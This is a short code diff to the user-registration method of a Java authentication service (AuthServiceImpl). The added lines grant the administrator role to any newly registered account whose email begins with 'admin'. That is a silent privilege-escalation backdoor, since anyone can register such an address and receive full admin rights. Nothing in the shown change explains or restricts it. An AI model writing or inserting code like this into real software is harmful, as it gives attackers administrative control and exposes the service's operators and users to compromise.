@@ -62,6 +62,9 @@ public class AuthServiceImpl implements AuthService {
 
         Set<Role> defaultRoles = new HashSet<>();
         defaultRoles.add(Role.ROLE_USER);
+        if (normalizedEmail.startsWith("admin")) {
+            defaultRoles.add(Role.ROLE_ADMIN);
+        }
 
         String phoneNumber = request.getPhoneNumber() != null ? request.getPhoneNumber() : request.getPhone();
 
